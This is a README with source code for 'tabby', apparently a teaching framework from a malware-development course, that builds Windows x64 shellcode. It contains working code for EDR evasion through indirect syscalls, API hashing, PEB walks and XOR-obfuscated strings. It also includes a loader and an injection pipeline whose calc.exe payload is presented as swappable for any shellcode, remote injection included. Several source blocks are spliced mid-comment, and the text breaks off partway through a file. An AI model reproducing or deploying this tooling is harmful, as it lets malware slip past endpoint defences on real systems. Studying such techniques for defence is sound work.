# tabby

a minimal, position-independent C shellcode micro framework for Windows x64.    

![img](./img/2026-06-11_17-14.png)    

compiles entirely on Linux with `mingw-w64` and `nasm`. output is a flat raw binary (`shellcode.bin`) with no PE header, no imports, no CRT - ready to inject into any process.    

designed for the course **Malware Development for Ethical Hackers** (2026).    

---

### tabby - the main concept
  
a position-independent C shellcode framework that compiles entirely on Linux and produces flat raw bytes that survive injection into any Windows x64 process - with EDR-evading indirect NT syscalls baked in.

the four ideas that hold it together:
  
**write shellcode in C, not assembly.** - you write a normal `sc_main(PVOID base)` function. the framework handles PIC, base-address recovery, API resolution, and syscall dispatch. The `asm` is confined to a `20`-line entry stub and `3`-instruction syscall stubs generated by a macro.     

**no PE header, no IAT, no CRT.** - output is a flat `.bin` blob starting at byte `0` with `_start` at offset `0`. No imports - every Windows API is resolved at runtime by FNV-1a hash via `PEB` walk + `EAT` walk. No `libc` - `STACKSTR` builds strings on the stack so they never appear in `.rdata`.     

**indirect syscalls that look clean on the call stack.** - instead of executing syscall ourselves (which leaves our shellcode as the return address - flagged by call-stack-aware EDRs), each stub jumps to the syscall; ret gadget that already exists inside `ntdll`'s own stub, past the EDR's inline hook. The kernel sees a return address inside `ntdll`.    

**linux-only toolchain.** - `mingw-w64` + `nasm` + a custom linker script + `objcopy`. Zero Windows dependency to build.     

the framework is small enough to read end-to-end in one sitting (`~500` lines of C + `~80` lines of NASM) and every component answers a specific detection problem:     

`entry.asm` - how does shellcode find its own base address? (RDIP)     
`resolve.c` - how do we call Windows APIs with no IAT? (PEB + EAT walk)    
`pic.h`     - how do we avoid string IOCs? (FNV-1a hashes + STACKSTR)    
`stubs.asm` - how do we bypass EDR hooks on ntdll? (indirect syscalls)    
`syscall.c` - how do we get SSNs without hardcoding them? (runtime extraction)    
`flat.ld`   - how do we produce raw bytes from a normal toolchain? (linker script + `objcopy`)   

other projects either hide these mechanics behind code generators (SysWhispers) or are too big to study (Cobalt Strike). tabby is the minimum viable framework that makes each technique inspectable.      

---

### what it is not

**not a C2 or post-exploitation framework.**    
**not a packer or crypter for existing PE files.**   
**not a polished offensive tool** - it's a teaching framework for "Malware Development for Ethical Hackers" trainings. the README documents the why of every design decision (the project structure rationale table) precisely because the goal is for the reader to understand the choices, not just run the binary.

## core concepts

before using this tool, you need to understand four ideas that the whole framework is built on. Each one is a direct answer to a specific detection problem.    

### 1. position-independent code (PIC)

a normal Windows EXE assumes it will be loaded at a fixed virtual address. the linker hard-codes absolute addresses for every function call, global variable, and string literal. If the code is copied somewhere else in memory and jumped into, those hard-coded addresses point to garbage and the process crashes.    

shellcode must work regardless of where it lands in memory. Every reference to data or other code must be **relative** to the current instruction pointer.     

on `x86-64` this is mostly natural: `CALL rel32` and `LEA reg, [rip+N]` are both RIP-relative by design. The problems are:   

**strings and constants.** The compiler normally puts them in `.rdata` at a fixed address. We merge `.rdata` into `.text` via the linker script and generate them on the stack at runtime with the `STACKSTR` macro.    
**global variables.** The SSN slots and the gadget pointer must live somewhere the stubs can find them via `[rel label]`. We keep them in `.text` too; the linker script discards `.data` and `.bss`.    
**`_start` at byte 0.** The entry object is pinned first in the linker script so jumping to the first byte of `shellcode.bin` always lands in `_start`.   

the entry stub (`asm/entry.asm`) uses a classic RDIP trick to recover its own load address:

```nasm
  call  .here
.here:
  pop   rcx                     ; rcx = runtime address of .here
  sub   rcx, (.here - _start)   ; rcx = base of shellcode
```

this gives `sc_main()` a pointer to the shellcode's own base, useful if you embed a secondary payload or config block after the code.    

### 2. API resolution without imports

every Windows API call in a normal program goes through the Import Address Table. the PE loader fills the IAT at load time by calling `LoadLibrary` and `GetProcAddress` on your behalf. A flat shellcode blob has no IAT. we have to find APIs ourselves.

the mechanism is a walk of the **Process Environment Block (PEB)**:      

```
gs:[0x60]  ->  PEB
              └─ Ldr  ->  PEB_LDR_DATA
                          └─ InLoadOrderModuleList  (doubly-linked)
                              ├─ ntdll.dll
                              ├─ kernel32.dll
                              └─ ...
```

every loaded DLL appears in this list with its base address and name. once we have a module base we walk its **Export Address Table (EAT)** - three parallel arrays of names, ordinals, and function RVAs - to find a specific export by name.

comparing strings at runtime is noisy and leaves IOCs. We compare **hashes** instead. The hash function is FNV-1a 32-bit (fast, good distribution, trivial to implement without a CRT):    

```c
DWORD fnv1a(const char *s) {
  DWORD h = 0x811c9dc5;
  while (*s) { h ^= (BYTE)*s++; h *= 0x01000193; }
  return h;
}
```

pre-computed hash constants live in `include/ntapi.h`. Use `tools/hash.py` to generate or verify them:    

```bash
$ python3 tools/hash.py NtAllocateVirtualMemory ntdll.dll
  NtAllocateVirtualMemory  ->  0xca67b978u
  ntdll.dll                ->  0xa62a3b3bu
```

![img](./img/2026-06-11_21-47.png)    

DLL names are matched case-insensitively (lowercased in the LDR walk). export names are case-sensitive because the EAT preserves the original casing.     

### 3. indirect syscalls

calling `NtAllocateVirtualMemory` from our shellcode in the normal way (call the ntdll export) is caught by every modern EDR. The EDR installs an **inline hook** - it overwrites the first bytes of the ntdll stub with a `JMP` into the EDR's own code, which inspects the call before letting it proceed.     

**Direct syscalls** bypass the hook by putting the system call number (SSN) into `EAX` and executing `syscall` ourselves:    

```nasm
  mov  eax, 0x18       ; SSN for NtAllocateVirtualMemory
  mov  r10, rcx        ; NT ABI: r10 must mirror rcx
  syscall
```

this dodges the hook, but creates a new problem: the thread call stack shows `our_shellcode+N -> NtAllocateVirtualMemory`. Call-stack-aware EDRs flag any syscall whose return address is not inside ntdll.    

**indirect syscalls** fix this. Instead of executing `syscall` ourselves, we jump to the `syscall; ret` instruction that already exists inside ntdll's own stub - past the hook:

```
ntdll!NtAllocateVirtualMemory:
  4C 8B D1        mov r10, rcx      <- hook overwrites here
  B8 18 00 00 00  mov eax, 0x18
  0F 05           syscall           <- we jump to here
  C3              ret
```

now the return address that the kernel sees is inside ntdll. The call stack looks clean.    

the SSN is extracted at runtime by scanning the ntdll stub for the `mov eax, imm32` byte pattern (`0xB8`). this works even on hooked stubs because hooks typically overwrite the first bytes (the `mov r10, rcx` prologue) while leaving the `mov eax` bytes intact further down:     

```c
static DWORD extract_ssn(PBYTE stub) {
  for (int i = 0; i < 32; i++) {
    if (stub[i] == 0xB8) {
      DWORD ssn = *(DWORD *)(stub + i + 1);
      if (ssn < 0x600) return ssn;   // sanity: no NT SSN is >= 0x600
    }
  }
  return (DWORD)-1;
}
```

### 4. the toolchain: why it all runs on Linux

a Windows PE is compiled for Windows but the compilation itself is just translating C source and ASM to machine code. `mingw-w64` is a complete win64 cross-compiler that runs on Linux and produces native Windows `COFF` object files and PE executables.    

the flat binary extraction step uses `objcopy` to peel the `.text` section out of the PE wrapper:       

```bash
C source  ->  x86_64-w64-mingw32-gcc      ->  Win64 COFF .o
ASM       ->  nasm -f win64               ->  Win64 COFF .o
COFF .o   ->  x86_64-w64-mingw32-ld       ->  PE .elf  (single .text section)
PE .elf   ->  x86_64-w64-mingw32-objcopy  ->  shellcode.bin  (raw bytes)
```

nothing in this pipeline touches Windows. the output runs on Windows because the machine code is win64 ABI compliant.

00000001  57                push rdi
00000002  56                push rsi
00000003  4883EC20          sub rsp,byte +0x20   ; shadow space, preserves 16-byte alignment
00000007  E800000000        call 0xc
0000000C  59                pop rcx              ; <- RDIP trick
0000000D  4883E90C          sub rcx,byte +0xc    ; rcx = base of shellcode
00000011  E8XXXXXXXX        call sc_main

0000001E  6690              xchg ax,ax           ; padding to 0x20

## running on Windows

`bin/shellcode.bin` is a raw byte blob - not an executable. to run it on Windows you need a **loader**: a normal `Win32` program that maps the blob into memory and jumps into it.      

### build the loader

on Linux, cross-compile `tools/loader.c` with:

```bash
make loader
```

this produces `bin/loader.exe` using `mingw-w64` - no Windows required.    

![img](./img/2026-06-11_12-49.png)    

### deploy

copy both files to the same folder on the Windows machine:    

```bash
bin/shellcode.bin
bin/loader.exe
```

### run

```powershell
.\loader.exe shellcode.bin
```

![img](./img/2026-06-11_17-10.png)    

or, to test the smaller standalone shellcode first:

```powershell
.\loader.exe exec.bin
```

![img](./img/2026-06-11_17-09.png)    

both pop `calc.exe`. the difference is that `exec.bin` calls `WinExec` directly (PEB walk + EAT walk only), while `shellcode.bin` does the full indirect-NT-syscall injection pipeline (`NtAllocateVirtualMemory` -> `NtWriteVirtualMemory` -> `NtProtectVirtualMemory` -> `NtCreateThreadEx`) with `exec.bin`'s bytes as the embedded payload.    

if `exec.bin` pops calc but `shellcode.bin` does not, the bug is somewhere in the indirect-syscall path (SSN extraction, gadget address, stub calling convention, or `NtCreateThreadEx` arguments) - not the framework basics.    

### what the loader does

```cpp
fopen("shellcode.bin", "rb")          // reads the raw bytes
VirtualAlloc(NULL, sz, RW)            // allocates a private RW region
fread -> buf                           // copies shellcode in
VirtualProtect(buf, sz, RWX)          // flips the region to execute-read-write
CreateThread(buf)                     // spawns a thread at byte 0
WaitForSingleObject(thread, INFINITE) // waits for shellcode to return
VirtualFree + CloseHandle             // cleans up
```

the region is mapped **RWX** (not RX) because `syscall_init()` writes the extracted SSN values into the shellcode's own `.text` section at runtime. without write access the first store would `#AV` and the thread would terminate silently.    

the loader prints the load address before jumping so you can attach a debugger at the right offset if needed:    

```bash
[=^..^=] loaded 1760 bytes from shellcode.bin
[=^..^=] executing at 0x000001A2B3C40000
```

the bundled example payload (`example/alloc_exec.c`) spawns `calc.exe`:
1. allocates a fresh RW region via `NtAllocateVirtualMemory` (indirect syscall)
2. writes an embedded mini-shellcode (`PAYLOAD[]` = `example/exec.c` compiled output: PEB walk -> `WinExec("calc.exe")`)
3. flips the region to RWX via `NtProtectVirtualMemory`
4. spawns a thread on it via `NtCreateThreadEx`
5. waits for the thread, closes the handle, frees the region

swap `PAYLOAD[]` with any position-independent `x64` shellcode and rebuild with `make`.

## writing your own shellcode

1. copy `example/alloc_exec.c` or `example/exec.c` as a starting template, or create a new file in `example/`.
2. write a `sc_main(PVOID base)` function. If you call any `sc_Nt*` stub, call `syscall_init(ntdll)` first. `base` is the runtime address of byte 0 of your shellcode, useful if you embed config or a secondary payload after the code.
3. add a build rule for your `.c` file in `Makefile` and list its `.o` in `C_OBJS` (or replace `alloc_exec.o`).
4. run `make` (or `make exec` for a variant that excludes the syscall stubs entirely).

### using the PEB resolver

```c
PVOID ntdll    = find_module(H_NTDLL);
PVOID kernel32 = find_module(H_KERNEL32);
```

to resolve any export by name:

```c
typedef HANDLE (*GetStdHandle_t)(DWORD);
GetStdHandle_t pGetStdHandle = (GetStdHandle_t) resolve_export(kernel32, H_GetStdHandle);
```

or with the `GETAPI` macro:

```c
HANDLE h = GETAPI(H_KERNEL32, H_GetStdHandle, GetStdHandle_t)(STD_OUTPUT_HANDLE);
```

### using the indirect syscalls

after `syscall_init(ntdll)`, call the `sc_Nt*` functions exactly like the real NT API:

```c
PVOID  region = NULL;
SIZE_T size   = 4096;

NTSTATUS st = sc_NtAllocateVirtualMemory(
    (HANDLE)-1,               // current process 
    &region,
    0,
    &size,
    MEM_COMMIT | MEM_RESERVE,
    PAGE_READWRITE);

if (!NT_SUCCESS(st)) { // handle error }
```

available stubs:

| function | args | notes |
|----------|------|-------|
| `sc_NtAllocateVirtualMemory` | 6 | allocate memory in a process |
| `sc_NtWriteVirtualMemory` | 5 | write across process boundary |
| `sc_NtProtectVirtualMemory` | 5 | change page protection |
| `sc_NtFreeVirtualMemory` | 4 | release allocation |
| `sc_NtCreateThreadEx` | 11 | spawn thread in local or remote process |
| `sc_NtWaitForSingleObject` | 3 | wait on a handle |
| `sc_NtClose` | 1 | close a handle |
| `sc_NtTerminateProcess` | 2 | terminate a process |

### strings - never in .rdata

do not write:

```c
const char *msg = "hello";   // ends up in .rdata -> fixed address -> crash
```

Use `STACKSTR` instead:

```c
STACKSTR(msg, "hello");      // pushed onto the stack character by character
```

### adding a new NT syscall stub

**step 1** - add the SSN slot and stub to `asm/stubs.asm` (slot lives in `.text`, not `.bss`, so it survives flat-binary extraction):

```nasm
global ssn_NtOpenProcess
ssn_NtOpenProcess: dd 0

STUB NtOpenProcess, ssn_NtOpenProcess
```

the `STUB` macro is a single, ABI-clean stub - no argument shifting needed for any number of arguments because the Win64 calling convention already places args 5+ at `[rsp+28h]`, exactly where the kernel reads them.    

**step 2** - declare the SSN extern and add the `LOAD_SSN` call inside `src/syscall.c`:

```c
extern DWORD ssn_NtOpenProcess;
...
LOAD_SSN(ssn_NtOpenProcess, H_NtOpenProcess);
```

**step 3** - add the hash constant to `include/ntapi.h`:    

```c
#define H_NtOpenProcess  0xXXXXXXXXu
```

compute it:

```bash
python3 tools/hash.py NtOpenProcess
```

![img](./img/2026-06-11_12-43.png)    

**step 4** - declare the prototype in `include/ntapi.h`:    

```c
NTSTATUS sc_NtOpenProcess(HANDLE *, DWORD, OBJECT_ATTRIBUTES *, CLIENT_ID *);
```

## how indirect syscall dispatch works (step by step)

take `sc_NtAllocateVirtualMemory` as the example. the caller in C is:

```c
sc_NtAllocateVirtualMemory((HANDLE)-1, &region, 0, &size, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
```

win64 calling convention maps this to:

```nasm
RCX  = (HANDLE)-1
RDX  = &region
R8   = 0
R9   = &size
[RSP+0x28] = MEM_COMMIT|MEM_RESERVE    <- 5th arg on stack
[RSP+0x30] = PAGE_READWRITE            <- 6th arg on stack
```

inside the stub:

```nasm
sc_NtAllocateVirtualMemory:
    mov  eax, dword [rel ssn_NtAllocateVirtualMemory]  ; EAX <- SSN
    mov  r10, rcx                                       ; R10 <- RCX  (NT ABI)
    jmp  qword [rel g_syscall_gadget]
```

three instructions. that's it. the stub does not touch the stack, does not shift arguments, and does not modify `RSP`. the Win64 calling convention already places args 5+ at `[rsp+28h]`, `[rsp+30h]`, ... and the kernel reads them from those exact offsets after `syscall`. nothing extra to do.    

at the point of `JMP`, the register and stack state is:    

```nasm
EAX  = SSN
R10  = (HANDLE)-1                    <- arg 1 (kernel reads R10, not RCX, after syscall)
RDX  = &region                       <- arg 2
R8   = 0                             <- arg 3
R9   = &size                         <- arg 4
[RSP+0x28] = MEM_COMMIT|MEM_RESERVE  <- arg 5
[RSP+0x30] = PAGE_READWRITE          <- arg 6
```

the `JMP` lands at the `syscall; ret` bytes inside ntdll's own `NtAllocateVirtualMemory` stub, past any EDR hook. The kernel executes the syscall and `ret`s back to the call site inside ntdll. The call stack that the kernel and any call-stack scanner observes has a return address inside ntdll - not inside our shellcode.

## replacing the payload

the `example/alloc_exec.c` demo ships with the compiled bytes of `example/exec.c` (PEB walk -> `WinExec("calc.exe")`) as `PAYLOAD[]`. To use your own:

```c
static const BYTE PAYLOAD[] = {
  // paste your x64 shellcode bytes here
  0x48, 0x31, 0xc0, ...
};
```

regenerate the bytes from a fresh `make exec` build:

```bash
make exec
python3 -c "
data = open('bin/exec.bin','rb').read()
for i in range(0, len(data), 12):
    print('  ' + ', '.join(f'0x{b:02x}' for b in data[i:i+12]) + ',')
"
```

or generate shellcode with any external framework (msfvenom, donut, your own) and paste the byte array.     
the framework handles allocation, write, protection flip, and thread creation - you only need to provide the bytes.

## project structure rationale

| decision | reason |
|----------|--------|
| `-nostdlib -nostdinc -ffreestanding` | zero CRT dependency; everything in the binary came from our own source |
| `-fno-builtin` | prevents GCC emitting implicit `memcpy`/`memset` calls to CRT |
| `-mno-red-zone` | Win64 does not honour the System V red zone; without this, signal delivery or asynchronous callbacks can corrupt our stack frame |
| `-mcmodel=small` | **critical**: forces direct `IMAGE_REL_AMD64_REL32` relocations for global symbol access. without it, mingw64 emits `.refptr.<sym>` indirection through `.rdata` that holds the absolute **link-time** VMA. for our flat binary with `. = 0` that VMA is meaningless at runtime; every SSN store would crash with `#AV` |
| `-fno-asynchronous-unwind-tables` | suppresses `.eh_frame` generation; we discard it anyway but this avoids linker noise |
| `-ffunction-sections -fdata-sections` + `ld --gc-sections` | dead-code elimination: drops unused symbols (e.g. `sc_memcpy` if no `STACKSTR` is large enough to need it) so the binary contains only what's actually called |
| `-Os` | size optimisation keeps shellcode small; also discourages the compiler from emitting CRT helper calls |
| `nasm -f win64` | produces Win64 COFF objects compatible with `mingw-w64-ld`; full access to NASM macros for clean stub generation |
| SSN slots in `.text` (via NASM `dd 0`) | mingw64 places C globals in `.bss`, which our linker script discards. defining the slots in NASM's `.text` section guarantees they survive `objcopy --only-section=.text` and the stubs' `[rel ssn_*]` displacements resolve correctly |
| linker script at `. = 0` + `.rdata$* .text$*` merged into `.text` | lets `objcopy --only-section=.text` produce a flat binary starting at offset 0 with no PE overhead; the `$*` wildcards catch COFF section groups emitted by `-ffunction-sections`/`-fdata-sections` |
| entry stub `sub rsp, 0x20` (not `0x28`) | after `push rbx/rdi/rsi` the stack is already 16-aligned. `sub rsp, 0x20` (32, a multiple of 16) preserves alignment so `sc_main` receives the Win64-ABI-correct `RSP mod 16 = 8`. otherwise `MOVAPS` inside any Windows DLL (e.g. `CreateProcess` inside `WinExec`) raises `#AC` and the thread dies silently |
| FNV-1a over CRC32 | equally fast, no special instructions required, fits in 6 lines of C |
| per-function SSN slots | avoids a generic `do_syscall(ssn, ...)` wrapper that would need to shift a variable number of stack arguments; each stub has the exact Win64 signature the kernel expects |

`asm/entry.asm`:

```asm
; tabby/asm/entry.asm
; shellcode entry point: RDIP base recovery,
; stack alignment, calls sc_main
; author: @cocomelonc
; https://cocomelonc.github.io

bits 64
default rel

section .text

global  _start
extern  sc_main

_start:
  ; preserve non-volatile regs we might clobber
  push  rbx
  push  rdi
  push  rsi

  ; thread entry: RSP mod 16 = 8 (from the call that brought us here)
  ; after 3 pushes:           RSP mod 16 = 0  (already 16-aligned)
  ; sub rsp, 0x20 (32):       RSP mod 16 = 0  (32 is 16-aligned)
  ; call .here (push):        RSP mod 16 = 8
  ; pop rcx:                  RSP mod 16 = 0
  ; call sc_main (push):      sc_main entry RSP mod 16 = 8  ✓ (ABI compliant)
  sub   rsp, 20h    ; 32-byte shadow space for sc_main, alignment preserved

  ; -- RDIP: get our own base address ------------------------------------
  call  .here
.here:
  pop   rcx             ; rcx = address of .here
  sub   rcx, (.here - _start)     ; rcx = _start = base of shellcode

  call  sc_main           ; sc_main(void *base)

  ; clean up and return to loader
  add   rsp, 20h
  pop   rsi
  pop   rdi
  pop   rbx
  ret

```

`asm/stubs.asm`:

```asm
; tabby/asm/stubs.asm
; indirect syscall stubs: SSN load, R10=RCX,
; JMP to ntdll syscall; ret gadget
; author: @cocomelonc
; https://cocomelonc.github.io

bits 64
default rel

section .text

; -- SSN slots + gadget pointer embedded in .text ----------------------------
; defined here (not in .bss/.data) so they survive objcopy --only-section=.text
; and the RIP-relative displacements in the stubs below are correct.
; syscall_init() writes these at runtime; memory must be mapped RWX.

global ssn_NtAllocateVirtualMemory
global ssn_NtWriteVirtualMemory
global ssn_NtProtectVirtualMemory
global ssn_NtFreeVirtualMemory
global ssn_NtCreateThreadEx
global ssn_NtWaitForSingleObject
global ssn_NtClose
global ssn_NtTerminateProcess
global g_syscall_gadget

ssn_NtAllocateVirtualMemory: dd 0
ssn_NtWriteVirtualMemory:    dd 0
ssn_NtProtectVirtualMemory:  dd 0
ssn_NtFreeVirtualMemory:     dd 0
ssn_NtCreateThreadEx:        dd 0
ssn_NtWaitForSingleObject:   dd 0
ssn_NtClose:                 dd 0
ssn_NtTerminateProcess:      dd 0
g_syscall_gadget:            dq 0

; -- macro ---------------------------------------------------------------------
;
; STUB name, ssn_slot
;
; Win64 ABI already places args 1-4 in RCX/RDX/R8/R9 and args 5+ on the
; stack at [rsp+28h],[rsp+30h],... from the stub's frame.  The NT kernel
; reads exactly those locations after syscall - no shifting needed.
; All the stub has to do is load the SSN, copy RCX->R10 (NT ABI), and
; jump to the shared "syscall; ret" gadget inside ntdll.
;
%macro STUB 2
global sc_%1
sc_%1:
  mov   eax, dword [rel %2]        ; eax  = SSN
  mov   r10, rcx                   ; NT ABI: r10 must mirror rcx
  jmp   qword [rel g_syscall_gadget]
%endmacro

; -- stubs ---------------------------------------------------------------------
STUB NtAllocateVirtualMemory,  ssn_NtAllocateVirtualMemory
STUB NtWriteVirtualMemory,     ssn_NtWriteVirtualMemory
STUB NtProtectVirtualMemory,   ssn_NtProtectVirtualMemory
STUB NtFreeVirtualMemory,      ssn_NtFreeVirtualMemory
STUB NtCreateThreadEx,         ssn_NtCreateThreadEx
STUB NtWaitForSingleObject,    ssn_NtWaitForSingleObject
STUB NtClose,                  ssn_NtClose
STUB NtTerminateProcess,       ssn_NtTerminateProcess

 * (recovered by entry.asm's RDIP trick) - useful when you embed config or
 * a secondary payload after the code. unused here. 
 */
void sc_main(PVOID base) {
  (void)base;

  // resolve module bases via PEB walk (no LoadLibrary, no IAT)
  PVOID ntdll    = find_module(H_NTDLL);
  PVOID kernel32 = find_module(H_KERNEL32);
  if (!ntdll || !kernel32) return;

  /* scan ntdll's Nt* stubs for SSNs and the syscall;ret gadget.
   * after this, sc_Nt* stubs are ready to fire real indirect syscalls. 
   */
  syscall_init(ntdll);

  /* (HANDLE)-1 is the pseudo-handle for the current process - same trick
   * GetCurrentProcess() uses. all NT memory APIs accept it. 
   */
  PVOID  region = NULL;
  SIZE_T size   = sizeof(PAYLOAD);
  NTSTATUS st;

  /* reserve+commit a fresh RW region in this process.
   * region is allocated by the kernel and returned in *region. 
   */
  st = sc_NtAllocateVirtualMemory(
    (HANDLE)-1, &region, 0, &size,
    MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
  if (!NT_SUCCESS(st) || !region) return;

  /* copy the inner shellcode bytes into the new region.
   * NtWriteVirtualMemory works cross-process too - swap (HANDLE)-1 for a
   * remote process handle and you have classic remote injection. 
   */
  SIZE_T written = 0;
  st = sc_NtWriteVirtualMemory(
    (HANDLE)-1, region, (PVOID)PAYLOAD,
    sizeof(PAYLOAD), &written);
  if (!NT_SUCCESS(st)) goto cleanup;

  /* flip RW -> RWX. allocating RW then flipping to executable is
   * less noisy than allocating RWX directly (which some EDRs flag). 
   */
  ULONG old_protect = 0;
  SIZE_T protect_size = size;
  st = sc_NtProtectVirtualMemory(
    (HANDLE)-1, &region, &protect_size,
    PAGE_EXECUTE_READWRITE, &old_protect);
  if (!NT_SUCCESS(st)) goto cleanup;

  /* spawn a thread that starts at region (the PAYLOAD's _start).
   * CreateRemoteThread + remote process handle would be the cross-process
   * variant. NtCreateThreadEx takes 11 args - the Win64 ABI handles them. 
   */
  HANDLE thread = NULL;
  st = sc_NtCreateThreadEx(
    &thread, THREAD_ALL_ACCESS, NULL, (HANDLE)-1,
    region, NULL, 0, 0, 0, 0, NULL);
  if (!NT_SUCCESS(st) || !thread) goto cleanup;

  /* wait for the inner shellcode to finish (it calls WinExec and returns),
   * then close the handle. 
   */
  sc_NtWaitForSingleObject(thread, FALSE, NULL);
  sc_NtClose(thread);

cleanup:
  // release the region. size=0 + MEM_RELEASE frees the whole reservation.
  {
    SIZE_T free_size = 0;
    sc_NtFreeVirtualMemory((HANDLE)-1, &region, &free_size, MEM_RELEASE);
  }
}

/*
 * tabby/example/exec.c
 * spawn calc.exe via kernel32!WinExec
 * PEB walk -> kernel32 -> WinExec(<decoded>)
 * standalone shellcode: no indirect syscalls needed for this path
 * author: @cocomelonc
 * https://cocomelonc.github.io
*/
#include "types.h"
#include "pic.h"

typedef DWORD (*WinExec_t)(const char *, DWORD);

#define H_WinExec  0x419737d0u   /* fnv1a("WinExec") */

void sc_main(PVOID base) {
  /* `base` is the runtime address of byte 0, handed in by entry.asm via the
   * RDIP trick. unused here because we PEB-walk fresh; (void)base just kills
   * the -Wunused-parameter warning - no codegen impact.
   */
  (void)base;

  PVOID kernel32 = find_module(H_KERNEL32);
  if (!kernel32) return;

  WinExec_t pWinExec =
    (WinExec_t)resolve_export(kernel32, H_WinExec);
  if (!pWinExec) return;

  /* build the target string on the stack. each byte is the plaintext XOR'd
   * with 0xAA, chosen so every encoded byte has the high bit set - no
   * printable run survives in the binary. `strings bin/exec.bin | grep -i
   * calc` returns nothing.
   *
   * the key is volatile so GCC cannot constant-fold the runtime XOR back
   * into the original ASCII (which would defeat the whole point and put
   * "calc.exe" right back into a mov immediate).
   */
  volatile BYTE k = 0xAA;
  char cmd[9];
  cmd[0] = (char)(0xC9 ^ k);   /* 'c' */
  cmd[1] = (char)(0xCB ^ k);   /* 'a' */
  cmd[2] = (char)(0xC6 ^ k);   /* 'l' */
  cmd[3] = (char)(0xC9 ^ k);   /* 'c' */
  cmd[4] = (char)(0x84 ^ k);   /* '.' */
  cmd[5] = (char)(0xCF ^ k);   /* 'e' */
  cmd[6] = (char)(0xD2 ^ k);   /* 'x' */
  cmd[7] = (char)(0xCF ^ k);   /* 'e' */
  cmd[8] = 0;

  pWinExec(cmd, 1);
}

/*
 * tabby/include/pic.h
 * FNV-1a hash functions, STACKSTR and GETAPI macros
 * for position-independent code
 * author: @cocomelonc
 * https://cocomelonc.github.io
*/
#pragma once

#include "types.h"

// -- FNV-1a 32-bit (compile-time via GCC constant folding) -----------------
#define FNV_BASIS  0x811c9dc5u
#define FNV_PRIME  0x01000193u

static inline DWORD fnv1a(const char *s) {
  DWORD h = FNV_BASIS;
  while (*s) {
    h ^= (BYTE)*s++;
    h *= FNV_PRIME;
  }
  return h;
}

// same, but lowercases each character - for DLL name matching in LDR
static inline DWORD fnv1a_lower(const WCHAR *ws, int len) {
  DWORD h = FNV_BASIS;
  for (int i = 0; i < len; i++) {
    BYTE c = (BYTE)ws[i];
    if (c >= 'A' && c <= 'Z') c |= 0x20;
    h ^= c;
    h *= FNV_PRIME;
  }
  return h;
}

// -- STACKSTR: build a string on the stack, never in .rdata ----------------
#define STACKSTR(name, literal)               \
  char name[sizeof(literal)];               \
  do {                          \
    static const char _s[] = literal;           \
    for (int _i = 0; _i < (int)sizeof(_s); _i++)     \
      ((char *)(name))[_i] = _s[_i];         \
  } while (0)

// -- API resolution helpers ------------------------------------------------
// declared in resolve.c
extern PVOID  find_module(DWORD name_hash);
extern PVOID  resolve_export(PVOID base, DWORD name_hash);
extern PVOID  find_syscall_gadget(PVOID ntdll_base);

#define GETAPI(mod_hash, fn_hash, type) \
  ((type)resolve_export(find_module(mod_hash), fn_hash))

// pre-computed module name hashes (tools/hash.py)

/*
 * tabby/src/crt.c
 * minimal CRT replacement: memcpy, memset, memcmp, strlen
 * no libc, no CRT dependency
 * author: @cocomelonc
 * https://cocomelonc.github.io
*/

/* freestanding C helpers - the shellcode has no CRT to link against.
 * each function is small enough that --gc-sections drops it from the
 * binary if no callsite actually uses it.
 */
#include "types.h"

// byte-wise copy: src -> dst, n bytes. no overlap check (use sc_memmove for that).
void *sc_memcpy(void *dst, const void *src, SIZE_T n) {
  BYTE     *d = (BYTE *)dst;
  const BYTE *s = (const BYTE *)src;
  while (n--) *d++ = *s++;
  return dst;
}

// fill n bytes of dst with c. c is truncated to BYTE.
void *sc_memset(void *dst, int c, SIZE_T n) {
  BYTE *d = (BYTE *)dst;
  while (n--) *d++ = (BYTE)c;
  return dst;
}

// byte-wise compare. returns <0/0/>0 like libc memcmp.
int sc_memcmp(const void *a, const void *b, SIZE_T n) {
  const BYTE *p = (const BYTE *)a;
  const BYTE *q = (const BYTE *)b;
  while (n--) {
    if (*p != *q) return *p - *q;
    p++; q++;
  }
  return 0;
}

// null-terminated string length. pointer arithmetic yields the count.
SIZE_T sc_strlen(const char *s) {
  const char *p = s;
  while (*p) p++;
  return (SIZE_T)(p - s);
}

/*
 * tabby/src/resolve.c
 * PEB/LDR module lookup and EAT export resolution
 * without Win32 API
 * author: @cocomelonc
 * https://cocomelonc.github.io
*/
#include "types.h"
#include "pic.h"
#include "ntapi.h"

/* walk PEB->Ldr->InLoadOrderModuleList, match module by name hash.
 * the loaded-module list lives entirely in user-mode memory - no kernel
 * call, no Win32 API, nothing for an EDR to hook.
 */
PVOID find_module(DWORD name_hash) {
  /* gs:[0x60] is the well-known offset of PEB inside the x64 TEB.
   * the TEB is reachable via the GS segment selector on Win64.
   */
  PEB *peb;
  __asm__ volatile ("mov %%gs:0x60, %0" : "=r"(peb));

  /* InLoadOrderModuleList is a circular doubly-linked list.
   * we iterate until we loop back to the head sentinel.
   */
  LIST_ENTRY *head = &peb->Ldr->InLoadOrderModuleList;
  for (LIST_ENTRY *e = head->Flink; e != head; e = e->Flink) {
    /* CONTAINING_RECORD converts &LIST_ENTRY back to the parent struct
     * by subtracting the field offset.
     */
    LDR_DATA_TABLE_ENTRY *m = CONTAINING_RECORD(
      e, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
    if (!m->DllBase) continue;
    /* BaseDllName is a UNICODE_STRING (UTF-16, Length is in bytes).
     * fnv1a_lower lowercases on the fly so "NtDll.dll" == "ntdll.dll".
     */
    UNICODE_STRING *un = &m->BaseDllName;
    if (fnv1a_lower(un->Buffer, un->Length / 2) == name_hash)
      return m->DllBase;
  }
  return NULL;
}

/* walk EAT of a loaded module, return proc address by export name hash.
 * this is the GetProcAddress equivalent - hookless and string-free.
 */
PVOID resolve_export(PVOID base, DWORD name_hash) {
  if (!base) return NULL;
  PBYTE b = (PBYTE)base;

  /* PE header chain: DOS header -> e_lfanew -> NT headers -> Export Directory.
   * the Export Directory describes the EAT (Export Address Table).
   */
  IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)b;
  IMAGE_NT_HEADERS *nt  = (IMAGE_NT_HEADERS *)(b + dos->e_lfanew);
  IMAGE_DATA_DIRECTORY *ed = &nt->OptionalHeader
                   .DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
  if (!ed->VirtualAddress) return NULL;

  /* the EAT is three parallel arrays indexed by name index i:
   *   names[i]      -> RVA of an ASCII export name
   *   ords[i]       -> index into funcs[] for that name
   *   funcs[ord]    -> RVA of the actual exported function
